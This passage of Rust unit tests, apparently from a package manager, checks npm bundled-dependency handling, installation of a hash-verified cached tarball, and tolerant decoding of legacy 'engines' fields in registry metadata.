        bundle_dependencies: Some(NpmStringList::Bool(true)),
        bundled_dependencies: None,
        peer_dependencies: None,
        peer_dependencies_meta: None,
    };

    assert!(npm_runtime_dependencies(&version_doc).is_empty());
}

#[test]
fn installs_npm_tarballs_with_root_directory_entries() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = npm_tgz_for_test(
        r#"{
                "name": "pkg",
                "version": "1.0.0"
            }"#,
    );
    let archive = dir.path().join(".omc/cache/npm/pkg.tgz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Npm, "pkg", "1.0.0");
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);

    let node_modules = dir.path().join("node_modules");
    let target = install_npm_package_to(dir.path(), &package, &node_modules).unwrap();
    assert!(target.join("package.json").exists());
}

#[test]
fn npm_packument_tolerates_legacy_engines_shapes() {
    let body = r#"{
            "dist-tags": { "latest": "3.0.0" },
            "versions": {
                "0.1.0": {
                    "version": "0.1.0",
                    "engines": ["node", "rhino"],
                    "dist": { "tarball": "https://r/lodash-0.1.0.tgz" }
                },
                "5.1.0": {
                    "version": "5.1.0",
                    "engines": ">=0.10.40",
                    "dist": { "tarball": "https://r/qs-5.1.0.tgz" }
                },
                "3.0.0": {
                    "version": "3.0.0",
                    "engines": { "node": ">=18" },
                    "dist": { "tarball": "https://r/pkg-3.0.0.tgz" }
                }
            }
        }"#;
    let root: NpmRoot = serde_json::from_str(body).expect("legacy engines must not fail decode");
    assert_eq!(root.dist_tags.latest, "3.0.0");
    // Legacy array/string forms parse as "no constraint"; the object form is kept.
    assert!(root.versions["0.1.0"].engines.is_none());
    assert!(root.versions["5.1.0"].engines.is_none());
    assert_eq!(
        root.versions["3.0.0"].engines.as_ref().unwrap()["node"],
        ">=18"
    );
}
